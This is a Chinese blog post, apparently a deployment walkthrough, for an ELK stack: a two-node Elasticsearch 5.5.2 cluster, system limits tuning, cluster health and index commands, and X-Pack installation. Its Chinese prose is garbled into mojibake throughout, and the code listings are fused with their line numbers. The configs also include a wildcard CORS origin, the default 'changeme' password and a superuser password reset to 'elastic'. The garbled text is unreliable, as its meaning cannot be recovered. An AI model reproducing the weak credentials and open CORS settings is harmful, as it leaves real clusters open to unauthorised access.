Graylogè¿™ä¸ªæ˜¯ä¸€æ‰¹é»‘é©¬ ä¹Ÿåˆ†äº«å‡ºæ¥ã€‚ ä¼˜åŠ¿ï¼šä½¿ç”¨ç®€å•åŠ£åŠ¿ï¼šéœ€ä¸Šä¼ æ—¥å¿—åˆ°å¤–éƒ¨ï¼Œä¸çµæ´»ï¼Œä¸æ˜“æ‰©å±•ï¼Œéœ€ä»˜è´¹ flume-ng + kafka + spark streaming + hbase(es/mysql) + zepplin/è‡ªç ”webå±•ç¤º ä¼˜åŠ¿ï¼šçµæ´»ï¼Œæ˜“äºæ‰©å±•ï¼Œæ•°æ®åˆ†æå’Œå¤„ç†èƒ½åŠ›å¼ºåŠ£åŠ¿ï¼šå¼€å‘éš¾åº¦é«˜ï¼Œå‘¨æœŸé•¿ï¼Œç»´æŠ¤æˆæœ¬é«˜ ELKä¼˜åŠ¿å’ŒåŠ£åŠ¿ï¼šä¼˜åŠ¿ï¼šå¼€æºæˆç†Ÿè§£å†³æ–¹æ¡ˆï¼Œä½¿ç”¨ç®€å•ï¼Œæ‰©å±•èƒ½åŠ›å¼ºåŠ£åŠ¿ï¼šæ—¥å¿—åˆ†æå’Œå¤„ç†ä¾é logstashå®Œæˆï¼Œå¤„ç†èƒ½åŠ›è¾ƒä½ï¼Œæ— æ³•é€‚åº”å¤æ‚çš„æ—¥å¿—åˆ†æåœºæ™¯ç»“è®ºï¼šåˆæ­¥é€‰æ‹©ELKæ­å»ºèµ·ç›‘æ§å¹³å°ï¼Œå…¶èƒ½å¤Ÿæ»¡è¶³å½“å‰è¾ƒä¸ºç®€å•çš„ç›‘æ§å’Œåˆ†æéœ€æ±‚ã€‚æœªæ¥å¦‚æœä¸èƒ½é€‚åº”ï¼Œå†è€ƒè™‘å…¶ä»–æ–¹æ¡ˆã€‚ åœ¨æœ¬æ¬¡å®è·µä¸­ï¼Œæˆ‘ä»¬æ‰€éƒ¨ç½²çš„ELKåˆ†å¸ƒå¼æ—¥å¿—ç³»ç»Ÿï¼Œå…¶æ¶æ„å¤§è‡´å¦‚ä¸‹ï¼š é¦–å…ˆåœ¨å„æ—¥å¿—äº§ç”Ÿæœºä¸Šéƒ¨ç½²æ”¶é›†å™¨Filebeatï¼Œç„¶åFilebeatå°†ç›‘æ§åˆ°çš„logæ–‡ä»¶å˜åŒ–æ•°æ®ä¼ è‡³Kafkaé›†ç¾¤ï¼ŒLogstashè´Ÿè´£å°†æ•°æ®ä»kafkaä¸­æ‹‰å–ä¸‹æ¥ï¼Œå¹¶è¿›è¡Œå­—æ®µè§£æï¼Œå‘Elasticsearchè¾“å‡ºç»“æ„åŒ–åçš„æ—¥å¿—ï¼ŒKibanaè´Ÿè´£å°†Elasticsearchä¸­çš„æ•°æ®è¿›è¡Œå¯è§†åŒ–ã€‚ ã€é‡ç‚¹å‚è€ƒã€‘ï¼šELKä¸­æ–‡ä¹¦ ä¸€ã€Elasticsearché›†ç¾¤1éƒ¨ç½²é¦–å…ˆåœ¨https://www.elastic.coä¸­æ‰¾åˆ°ESçš„å®‰è£…åŒ…ã€‚ä¸‹æ–‡ä¸­æ‰€ç”¨çš„å®‰è£…åŒ…å‡ä¸ºLinux 64çš„tar.gzå‹ç¼©åŒ…ï¼Œè§£å‹å³å¯ç”¨ã€‚å®˜ç½‘å®‰è£…æ–¹æ³•:Installation example with tar 1234567curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.2.tar.gztar -xvf elasticsearch-5.5.2.tar.gzcd /usr/local/elasticsearch-5.5.2/binuseradd elasticsearch chown -R /usr/local/elasticsearch-5.5.2/su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d\"è¿™é‡Œæˆ‘åˆ‡æ¢æ™®é€šesç”¨æˆ·å¯åŠ¨ï¼Œè®°å¾—ç»™äºˆæƒé™ã€‚ Elasticsearchè‡³å°‘éœ€è¦Java 8ã€‚åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå»ºè®®æ‚¨ä½¿ç”¨Oracle JDKç‰ˆæœ¬1.8.0_131ã€‚Javaå®‰è£…å› å¹³å°è€Œå¼‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œä¸å†èµ˜è¿°ã€‚Oracleçš„æ¨èå®‰è£…æ–‡æ¡£å¯ä»¥åœ¨Oracleçš„ç½‘ç«™ä¸Šæ‰¾åˆ°ã€‚åœ¨å®‰è£…Elasticsearchä¹‹å‰ï¼Œè¯·å…ˆæ£€æŸ¥æ‚¨çš„Javaç‰ˆæœ¬ï¼Œç„¶åå†è¿è¡Œï¼ˆå¦‚æœéœ€è¦ï¼Œè¯·ç›¸åº”åœ°è¿›è¡Œå®‰è£…/å‡çº§ï¼‰ï¼š 12java -versionecho $JAVA_HOME JVMå‚æ•°è®¾ç½® ElasticSearch5.0.0éœ€è¦è®¾ç½®æœåŠ¡å™¨max_map_countElasticSearch5.0.0è¦æ±‚æœ€å°ä¸º262144 é»˜è®¤å†…å­˜æ˜¯2G è¿™é‡Œæˆ‘ç»™6Gå†…å­˜. 1234567891011121314151617181920vim config/jvm.options-Xms6g-Xmx6g-XX:+UseConcMarkSweepGC-XX:CMSInitiatingOccupancyFraction=75-XX:+UseCMSInitiatingOccupancyOnly-XX:+AlwaysPreTouch-server-Xss1m-Djava.awt.headless=true-Dfile.encoding=UTF-8-Djna.nosys=true-Djdk.io.permissionsUseCanonicalPath=true-Dio.netty.noUnsafe=true-Dio.netty.noKeySetOptimization=true-Dio.netty.recycler.maxCapacityPerThread=0-Dlog4j.shutdownHookEnabled=false-Dlog4j2.disable.jmx=true-Dlog4j.skipJansi=true-XX:+HeapDumpOnOutOfMemoryError 1234567891011121314[root@logstash ~]# curl http://localhost:9200?pretty&#123; \"name\" : \"s-28M-e\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"0U3blQviRcSG_pq8KFQ5EA\", \"version\" : &#123; \"number\" : \"5.5.2\", \"build_hash\" : \"b2f0c09\", \"build_date\" : \"2017-08-14T12:33:14.154Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.0\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 1.1 Elasticsearchçš„é…ç½®ESçš„é…ç½®æ–‡ä»¶åœ¨è§£å‹æ ¹ç›®å½•ä¸‹çš„configæ–‡ä»¶å¤¹ä¸­ï¼Œå…¶ä¸­elasticsearch.ymlæ˜¯ä¸»é…ç½®æ–‡ä»¶ã€‚ä»¥åŸºæœ¬å¯ç”¨ä½œä¸ºéƒ¨ç½²ç›®æ ‡ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ä»…éœ€è¦è®¾ç½®å‡ ä¸ªé‡è¦å‚æ•°ï¼š cluster.nameã€node.nameè¿™ä¸¤è€…é¡¾åæ€ä¹‰ï¼Œä½œä¸ºé›†ç¾¤å’ŒèŠ‚ç‚¹çš„æ ‡è¯†ç¬¦ã€‚ Pathséƒ¨åˆ†ä¸‹çš„path.dataå’Œpath.logsï¼Œè¡¨ç¤ºESçš„æ•°æ®å­˜æ”¾ä½ç½®ï¼Œå‰è€…ä¸ºæ•°æ®å­˜å‚¨ä½ç½®ï¼Œåè€…ä¸ºESçš„logå­˜å‚¨ä½ç½®ã€‚è¯·å°½é‡æ”¾åˆ°å‰©ä½™ç©ºé—´è¶³å¤Ÿçš„åœ°æ–¹ï¼Œæ­¤å¤–åœ¨è¿›è¡Œè°ƒä¼˜æ—¶æœ‰ä¸€ç§æ–¹æ³•æ˜¯å°†æ•°æ®æ”¾ç½®åˆ°SSDä¸Šã€‚ bootstrap.memory_lock: trueï¼Œè®¾ä¸ºtrueä»¥ç¡®ä¿ESæ‹¥æœ‰è¶³å¤Ÿçš„JVMå†…å­˜ã€‚ network.host: localhostå’Œhttp.portï¼Œåœ¨æ­¤å¤„è®¾ç½®ESå¯¹å¤–æœåŠ¡çš„IPåœ°å€ä¸ç«¯å£è®¾ç½®å®Œä»¥ä¸Šå‡ é¡¹å‚æ•°åï¼Œå³å¯åœ¨ESæ ¹ç›®å½•ä¸‹ä½¿ç”¨å‘½ä»¤./bin/elasticsearchå¯åŠ¨ESè¿›ç¨‹ã€‚ä¹Ÿæœ‰ç›¸åº”çš„åå°å¯åŠ¨æ–¹å¼ï¼Œå…·ä½“ä¸èµ˜è¿°ã€‚ ä¸»è¦é…ç½®æ–‡ä»¶ 1234567891011121314[elasticsearch@logstash elasticsearch-5.5.2]$ cat config/elasticsearch.yml | grep -Pv \"^$|^#\"cluster.name: jolly-clusternode.master: truenode.data: truenode.name: es-jollychic-node1path.data: /data/elasticsearch/es-datapath.logs: /data/elasticsearch/es-logsbootstrap.memory_lock: truebootstrap.system_call_filter: falsenetwork.host: 10.11.10.26,127.0.0.1http.port: 9200discovery.zen.ping.unicast.hosts: [\"10.11.10.26\", \"10.11.10.45\"]http.cors.enabled: truehttp.cors.allow-origin: \"*\" ä¿®æ”¹Linuxç³»ç»Ÿå‚æ•° 1234567891011121314151617181920212223242526272829303132max file descriptors [4096] for elasticsearch process likely too low, increase to at least [65536]max number of threads [1024] for user [lishang] likely too low, increase to at least [2048]è§£å†³ï¼šåˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œç¼–è¾‘limits.conf æ·»åŠ ç±»ä¼¼å¦‚ä¸‹å†…å®¹vi /etc/security/limits.conf æ·»åŠ å¦‚ä¸‹å†…å®¹:* soft nofile 65536* hard nofile 131072* soft nproc 2048* hard nproc 4096é—®é¢˜ä¸‰ï¼šmax number of threads [1024] for user [lish] likely too low, increase to at least [2048]è§£å†³ï¼šåˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œè¿›å…¥limits.dç›®å½•ä¸‹ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚vi /etc/security/limits.d/90-nproc.conf ä¿®æ”¹å¦‚ä¸‹å†…å®¹ï¼š* soft nproc 1024#ä¿®æ”¹ä¸º* soft nproc 2048é—®é¢˜å››ï¼šmax virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144]è§£å†³ï¼šåˆ‡æ¢åˆ°rootç”¨æˆ·ä¿®æ”¹é…ç½®sysctl.confvi /etc/sysctl.conf æ·»åŠ ä¸‹é¢é…ç½®ï¼švm.max_map_count=655360å¹¶æ‰§è¡Œå‘½ä»¤ï¼šsysctl -pç„¶åï¼Œé‡æ–°å¯åŠ¨elasticsearchï¼Œå³å¯å¯åŠ¨æˆåŠŸã€‚ é›†ç¾¤å¥åº·æ£€æŸ¥ Cluster Healthè¦æ£€æŸ¥ç¾¤é›†çš„è¿è¡ŒçŠ¶å†µï¼Œæˆ‘ä»¬å°†ä½¿ç”¨_catAPIã€‚æ‚¨å¯ä»¥åœ¨Kibanaçš„æ§åˆ¶å°ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ–¹æ³•æ˜¯ å•å‡»â€œæŸ¥çœ‹æ§åˆ¶å°â€æˆ–curlå•å‡»ä¸‹é¢çš„â€œå¤åˆ¶ä¸ºCURLâ€é“¾æ¥å¹¶å°†å…¶ç²˜è´´åˆ°ç»ˆç«¯ä¸­ã€‚ 123curl -sXGET \"http://10.11.10.26:9200/_cat/health?v\"epoch timestamp cluster status node.total node.data shards pri relo init unassign pending_tasks max_task_wait_time active_shards_percent1509960188 17:23:08 jolly-cluster green 2 2 4081 3986 0 2 3889 0 - 100% æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„é›†ç¾¤åä¸ºâ€œelasticsearchâ€æ˜¯ç»¿è‰²çš„ã€‚ æ¯å½“æˆ‘ä»¬è¦æ±‚ç¾¤é›†å¥åº·ï¼Œæˆ‘ä»¬è¦ä¹ˆç»¿è‰²ï¼Œé»„è‰²ï¼Œæˆ–çº¢è‰²ã€‚ ç»¿è‰² - ä¸€åˆ‡éƒ½å¾ˆå¥½ï¼ˆé›†ç¾¤åŠŸèƒ½é½å…¨ï¼‰ é»„è‰² - æ‰€æœ‰æ•°æ®éƒ½å¯ç”¨ï¼Œä½†ä¸€äº›å‰¯æœ¬å°šæœªåˆ†é…ï¼ˆç¾¤é›†å®Œå…¨å¯ç”¨ï¼‰ çº¢è‰² - æŸäº›æ•°æ®ä¸ç®¡å‡ºäºä½•ç§åŸå› ï¼ˆç¾¤é›†éƒ¨åˆ†åŠŸèƒ½ï¼‰ ####### âœ¨âœ¨æ³¨æ„ï¼šå½“ä¸€ä¸ªç¾¤é›†ä¸ºçº¢è‰²æ—¶ï¼Œå®ƒå°†ç»§ç»­æä¾›æ¥è‡ªå¯ç”¨ç¢ç‰‡çš„æœç´¢è¯·æ±‚ï¼Œä½†æ˜¯æ‚¨å¯èƒ½éœ€è¦å°½å¿«ä¿®å¤å®ƒï¼Œå› ä¸ºæœ‰æœªåˆ†é…çš„ç¢ç‰‡ã€‚ æŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹åˆ—è¡¨ï¼š 123[root@logstash ~]# curl -XGET http://10.11.10.26:9200/_cat/nodes?vip heap.percent ram.percent cpu load_1m load_5m load_15m node.role master name10.11.10.26 51 96 18 5.02 5.60 3.58 mdi * es-jollychic-node1 åˆ›å»ºç´¢å¼•ï¼šç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨PUTåˆ›å»ºäº†ä¸€ä¸ªå«åšâ€œcustomerâ€çš„ç´¢å¼•ã€‚æˆ‘ä»¬ç®€å•åœ°å°†prettyé™„åŠ åˆ°è°ƒç”¨çš„å°¾éƒ¨ï¼Œä½¿å…¶ä»¥ç¾è§‚çš„å½¢å¼æ‰“å°å‡ºJSONå“åº” 1curl -XPUT 'http://10.11.10.26:9200/customer?pretty' 12345[root@logstash ~]# curl -XGET http://10.11.10.26:9200/_cat/master?helpid | | node idhost | h | host nameip | | ip addressnode | n | node name æŸ¥çœ‹æ‰€æœ‰è¿æ¥çš„ç´¢å¼•ï¼š 12345678910[elasticsearch@logstash ~]$ curl -sXGET \"http://$(hostname):9200/_cat/indices?v\"health status index uuid pri rep docs.count docs.deleted store.size pri.store.sizeyellow open log-wms31-web-product-2017.08.25 LIKJyNXrRcmQSt8aXRoyLg 5 1 614 0 361.6kb 361.6kbyellow open log-payment-center-product-2017.08.26 w-ucGJUoTDOdhEkfrq9g-g 5 1 1712756 0 808.4mb 808.4mbyellow open .kibana p9MnvKHRS6K_jCeBtB7CXA 1 1 18 1 77.8kb 77.8kbyellow open log-jcm-product-2017.08.25 Cs0XHa-xRQOHxt1-HYz1Xw 5 1 46303455 0 8.1gb 8.1gbyellow open log-spm_mq-product-2017.08.25 FXYNV08zQselbnVKK7k01g 5 1 465127 0 148.1mb 148.1mbyellow open log-erpsearchservice-product-2017.08.26 Z4ECtHCJS2uma_UTxJqDLw 5 1 2217 0 15.3mb 15.3mbyellow open log-wms31-web-product-2017.08.24 mYAhjM5UQFyIZAN8nFeYQQ 5 1 951572 0 237.5mb 237.5mbyellow open log-spm_mq-product-2017.08.26 -PJCMMVqRwWXux8V5SRbCA 5 1 1457469 0 503.1mb 503.1mb åˆ é™¤æŒ‡å®šç´¢å¼•ï¼š 1curl -XDELETE \"http://$(hostname):9200/log-wms-product-2017.08.19\" æ³¨æ„âœ¨âœ¨ ï¼š ä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°åœ¨ä¸Šé¢çš„ç»“æœä¸­ï¼ŒçŠ¶æ€è¢«æ ‡è®°ä¸ºå±é™©çš„é»„è‰²ï¼Œè€Œä¸æ˜¯å®‰å…¨çš„ç»¿è‰²ã€‚å®é™…ä¸Šæˆ‘ä»¬çš„å®‰è£…æ­¥éª¤æ²¡æœ‰é—®é¢˜ï¼Œä¹‹æ‰€ä»¥ä¼šæ˜¾ç¤ºé»„è‰²ï¼Œå®é™…ä¸Šæ˜¯å› ä¸ºä»é›†ç¾¤çš„è§’åº¦çœ‹ï¼Œè¿™ä¸ªé›†ç¾¤ç›®å‰åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ•°æ®æœ‰ä¸¢å¤±çš„é£é™©ã€‚ä¸è¿‡å¦‚æœæˆ‘ä»¬åªæ˜¯åœ¨ä¸€äº›å®‰å…¨æ€§è¦æ±‚ä¸å¤ªé«˜çš„é¡¹ç›®ä¸Šä½¿ç”¨ï¼Œé‚£ä¹ˆä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¯ä»¥æ¥å—çš„ã€‚äºŒã€Elasticsearché›†ç¾¤node2éƒ¨ç½²1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.2.tar.gztar -xvf elasticsearch-5.5.2.tar.gzcd /usr/local/elasticsearch-5.5.2/binuseradd elasticsearch chown -R /usr/local/elasticsearch-5.5.2/su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d\"è¿™é‡Œæˆ‘åˆ‡æ¢æ™®é€šesç”¨æˆ·å¯åŠ¨ï¼Œè®°å¾—ç»™äºˆæƒé™ã€‚mkdir /data/es-jollychic vim config/jvm.options ä¿®æ”¹å†…å­˜ä¼˜åŒ–-Xms6g-Xmx6g-XX:+UseConcMarkSweepGC-XX:CMSInitiatingOccupancyFraction=75-XX:+UseCMSInitiatingOccupancyOnly-XX:+AlwaysPreTouchä¿®æ”¹elasticsearch.ymlé…ç½®[elasticsearch@logstash elasticsearch-5.5.2]$ cat config/elasticsearch.yml | grep -Pv \"^$|^#\"cluster.name: jolly-clusternode.master: falsenode.data: truenode.name: es-jollychic-node2path.data: /data/elasticsearch/es-datanetwork.host: 10.11.10.45,127.0.0.1bootstrap.memory_lock: falsebootstrap.system_call_filter: falsehttp.port: 9200discovery.zen.ping.unicast.hosts: [\"10.11.10.26\", \"10.11.10.45\"]æŸ¥çœ‹å¯åŠ¨è¿›ç¨‹æœåŠ¡:[root@logstash2 config]# netstat -ntulp | grep javatcp 0 0 ::ffff:10.11.10.45:9200 :::* LISTEN 18118/javatcp 0 0 ::ffff:127.0.0.1:9200 :::* LISTEN 18118/javatcp 0 0 ::ffff:10.11.10.45:9300 :::* LISTEN 18118/javatcp 0 0 ::ffff:127.0.0.1:9300 :::* LISTEN 18118/javaæŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹åˆ—è¡¨ï¼šæˆ‘ä»¬ä¹Ÿå¯ä»¥å¾—åˆ°æˆ‘ä»¬å•èŠ‚ç‚¹çš„åˆ—è¡¨å¦‚ä¸‹ï¼š[root@es_01 data]# curl -XGET http://10.11.10.26:9200/_cat/nodes?vip heap.percent ram.percent cpu load_1m load_5m load_15m node.role master name10.11.10.45 40 98 23 5.90 4.75 4.75 di - es-jollychic-node210.11.10.26 54 97 42 2.32 2.60 2.95 mdi * es-jollychic-node1æŸ¥çœ‹é›†ç¾¤èŠ‚ç‚¹ç´¢å¼•ï¼š[elasticsearch@logstash ~]$ curl -sXGET \"http://$(hostname):9200/_cat/indices?v\"health status index uuid pri rep docs.count docs.deleted store.size pri.store.sizegreen open log-wms31-web-product-2017.08.25 LIKJyNXrRcmQSt8aXRoyLg 5 1 614 0 361.6kb 361.6kbgreen open log-payment-center-product-2017.08.26 w-ucGJUoTDOdhEkfrq9g-g 5 1 1712756 0 808.4mb 808.4mbgreen open .kibana p9MnvKHRS6K_jCeBtB7CXA 1 1 18 1 77.8kb 77.8kbgreen open log-jcm-product-2017.08.25 Cs0XHa-xRQOHxt1-HYz1Xw 5 1 46303455 0 8.1gb 8.1gbgreen open log-spm_mq-product-2017.08.25 FXYNV08zQselbnVKK7k01g 5 1 465127 0 148.1mb 148.1mbgreen open log-erpsearchservice-product-2017.08.26 Z4ECtHCJS2uma_UTxJqDLw 5 1 2217 0 15.3mb 15.3mbgreen open log-wms31-web-product-2017.08.24 mYAhjM5UQFyIZAN8nFeYQQ 5 1 951572 0 237.5mb 237.5mbgreen open log-spm_mq-product-2017.08.26 -PJCMMVqRwWXux8V5SRbCA 5 1 1457469 0 503.1mb 503.1mb 1.1 Elasticsearch 5.xçš„Bootstrap ChecksElasticsearchåœ¨å‡çº§åˆ°5.xç‰ˆæœ¬åï¼Œå¯åŠ¨æ—¶ä¼šå¼ºåˆ¶æ‰§è¡ŒBootstrap Checks(å®˜æ–¹æ–‡æ¡£)å…¶ä¸­ç»å¸¸æ€§çš„é—®é¢˜æ˜¯éœ€è¦å¢å¤§ç³»ç»Ÿå¯ä½¿ç”¨çš„æœ€å¤§FileDescriptorsæ•°ï¼ˆå‚è€ƒhttps://www.elastic.co/guide/en/elasticsearch/reference/current/file-descriptors.htmlï¼‰å‰©ä¸‹çš„å…¶ä»–é—®é¢˜å¯ä»¥æŸ¥è¯¢å®˜æ–¹æ–‡æ¡£ã€‚ 1.2 Elasticsearchçš„X-packæ’ä»¶X-packæ˜¯å®˜æ–¹æä¾›çš„ä¸€ç³»åˆ—é›†æˆæ’ä»¶ï¼ŒåŒ…æ‹¬äº†alertã€monitorã€secureç­‰åŠŸèƒ½ï¼Œååˆ†å¼ºå¤§ï¼ˆä½†æ˜¯å¹¶ä¸å…è´¹ï¼‰ã€‚åœ¨ELK 5.0ä¸­å®‰è£…å¤§éƒ¨åˆ†æ’ä»¶ä»…éœ€è¦è¾“å…¥å‘½ä»¤ï¼š./bin/elasticsearch-plugin install &lt;plugin name&gt;å³å¯X-packæ’ä»¶å®‰è£…åä¼šè‡ªåŠ¨å¼€å¯ELKçš„æƒé™åŠŸèƒ½ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœå¯ç”¨äº†X-packï¼Œåˆ™åœ¨å‘ESè¾“å…¥æ•°æ®æˆ–å‘èµ·APIè¯·æ±‚æ—¶ï¼Œå‡éœ€è¦é™„å¸¦ç›¸åº”çš„authä¿¡æ¯ã€‚è€ƒè™‘åˆ°X-packå¹¶éå…è´¹ä¸”ä»·æ ¼æ˜‚è´µï¼Œæš‚æ—¶ä¸å®‰è£…X-packåŒ…ã€‚ ç¬¬ä¸€æ­¥ï¼šElasticsearchå®‰è£… x-packåœ¨ Elasticsearch çš„æ ¹ç›®å½•ï¼Œè¿è¡Œ bin/elasticsearch-plugin è¿›è¡Œå®‰è£…ï¼š 123456789101112131415161718192021222324252627282930[elasticsearch@logstash elasticsearch-5.5.2]$ ./bin/elasticsearch-plugin install x-pack-&gt; Downloading x-pack from elastic[=================================================] 100%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: plugin requires additional permissions @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@* java.io.FilePermission \\\\.\\pipe\\* read,write* java.lang.RuntimePermission accessClassInPackage.com.sun.activation.registries* java.lang.RuntimePermission getClassLoader* java.lang.RuntimePermission setContextClassLoader* java.lang.RuntimePermission setFactory* java.security.SecurityPermission createPolicy.JavaPolicy* java.security.SecurityPermission getPolicy* java.security.SecurityPermission putProviderProperty.BC* java.security.SecurityPermission setPolicy* java.util.PropertyPermission * read,write* java.util.PropertyPermission sun.nio.ch.bugLevel write* javax.net.ssl.SSLPermission setHostnameVerifierSee http://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.htmlfor descriptions of what these permissions allow and the associated risks.Continue with installation? [y/N]y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: plugin forks a native controller @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@This plugin launches a native controller that is not subject to the Javasecurity manager nor to system call filters.Continue with installation? [y/N]y-&gt; Installed x-pack æœåŠ¡å¯åŠ¨åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ elasticsearch æä¾›çš„ API æ¥ç¡®è®¤ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ï¼š 1234567891011121314shell&gt; curl http://localhost:9200/&#123; \"name\" : \"...\", \"cluster_name\" : \"...\", \"cluster_uuid\" : \"...\", \"version\" : &#123; \"number\" : \"...\", \"build_hash\" : \"...\", \"build_date\" : \"...\", \"build_snapshot\" : false, \"lucene_version\" : \"...\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; é‡å¯æœåŠ¡1su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d ç¼ºçœæƒ…å†µä¸‹ï¼Œelasticsearch æœåŠ¡ä¼šç›‘å¬9200ç«¯å£ï¼Œå¦‚æœä½ æƒ³è‡ªå®šä¹‰ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œé‚£ä¹ˆå¯ä»¥è®¾ç½® elasticsearch.yml é…ç½®æ–‡ä»¶ä¸­çš„ network.host å’Œ http.port é€‰é¡¹ã€‚ elasticsearchæœåŠ¡æ¨èå®‰è£… x-pack æ’ä»¶ï¼Œå®ƒåœ¨å®‰å…¨ç›‘æ§ç­‰æ–¹é¢ä¸º elasticsearchæä¾›äº†å®Œå–„çš„æ”¯æŒï¼šè®¿é—®åœ°å€ï¼šhttp://10.11.10.26:9200/?pretty ä¼šå‘ç°åœ¨å®‰è£…äº† x-pack ä¹‹åè®¿é—®å—åˆ°é™åˆ¶ï¼šè¿™é‡Œé»˜è®¤çš„ç”¨æˆ·åï¼šelasticï¼Œå¯†ç ï¼šchangeme 123456789101112131415[elasticsearch@logstash ~]$ curl -u elastic http://10.11.10.26:9200/Enter host password for user 'elastic':&#123; \"name\" : \"es-jollychic-node1\", \"cluster_name\" : \"jolly-cluster\", \"cluster_uuid\" : \"hxR0DDN7TTa3tNnYtMIbbA\", \"version\" : &#123; \"number\" : \"5.5.2\", \"build_hash\" : \"b2f0c09\", \"build_date\" : \"2017-08-14T12:33:14.154Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.0\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; ä¸è¿‡ä½¿ç”¨ç¼ºçœå¯†ç æ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä¿®æ”¹å®ƒ,å¯ä»¥é€šè¿‡ curl ä¿®æ”¹é»˜è®¤å¯†ç :elastic 123[elasticsearch@logstash ~]$ curl -XPUT -u elastic -d '&#123;\"password\": \"elastic\"&#125;' \\&gt; 'http://10.11.10.26:9200/_xpack/security/user/elastic/_password'Enter host password for user 'elastic': å¯ç”¨å’Œç¦ç”¨å¯ç”¨å’Œç¦ç”¨X-PackåŠŸèƒ½ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰X-PackåŠŸèƒ½éƒ½è¢«å¯ç”¨ã€‚æ‚¨å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨ç‰¹å®šçš„X-PackåŠŸèƒ½elasticsearch.ymlï¼Œkibana.ymlä»¥åŠlogstash.yml é…ç½®æ–‡ä»¶ã€‚ 1234567è®¾ç½® æè¿°xpack.graph.enabled è®¾ç½®ä¸ºfalseç¦ç”¨X-Packå›¾å½¢åŠŸèƒ½ã€‚xpack.ml.enabled è®¾ç½®ä¸ºfalseç¦ç”¨X-Packæœºå™¨å­¦ä¹ åŠŸèƒ½ã€‚xpack.monitoring.enabled è®¾ç½®ä¸ºfalseç¦ç”¨X-Packç›‘è§†åŠŸèƒ½ã€‚xpack.reporting.enabled è®¾ç½®ä¸ºfalseç¦ç”¨X-PackæŠ¥å‘ŠåŠŸèƒ½ã€‚xpack.security.enabled è®¾ç½®ä¸ºfalseç¦ç”¨X-Packå®‰å…¨åŠŸèƒ½ã€‚xpack.watcher.enabled è®¾ç½®falseä¸ºç¦ç”¨è§‚å¯Ÿå™¨ã€‚ ç¬¬äºŒæ­¥ï¼šKibana å®‰è£…x-pack1234567891011[root@logstash ~]# /usr/local/kibana-5.5.2/bin/kibana-plugin install x-packAttempting to transfer from x-packAttempting to transfer from https://artifacts.elastic.co/downloads/kibana-plugins/x-pack/x-pack-5.5.2.zipTransferring 119363535 bytes....................Transfer completeRetrieving metadata from plugin archiveExtracting plugin archiveExtraction completeOptimizing and caching browser bundles...Plugin installation completeYou have new mail in /var/spool/mail/root ä¿®æ”¹å¯†ç ä¿®æ”¹kibanaå¯†ç ï¼šä¿®æ”¹ä¹‹å‰éœ€è¦åœ¨kibana.ymlä¸­é…ç½®elasticsearchçš„ç”¨æˆ·åå’Œå¯†ç åæ‰èƒ½éœ€æ”¹å¯†ç ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ 1234567891011121314# If your Elasticsearch is protected with basic authentication, these settings provide# the username and password that the Kibana server uses to perform maintenance on the Kibana# index at startup. Your Kibana users still need to authenticate with Elasticsearch, which# is proxied through the Kibana server.elasticsearch.username: \"elastic\"elasticsearch.password: \"your password\"## æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·[root@logstash config]# curl -XGET -u elastic:elastic '10.11.10.26:9200/_xpack/security/user?pretty'&#123; \"elastic\" : &#123; \"username\" : \"elastic\", \"roles\" : [ \"superuser\" Monitoring(å…è´¹ç‰ˆæœ¬åªæ”¯æŒå• ES é›†ç¾¤)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455é›†ç¾¤çº§åˆ«ï¼šUptime ï¼š é›†ç¾¤è¿è¡Œæ—¶é—´ï¼›èŠ‚ç‚¹çº§åˆ«ï¼šDisk Availableï¼šå¯ç”¨ç£ç›˜ï¼›JVM Heapï¼š JVM 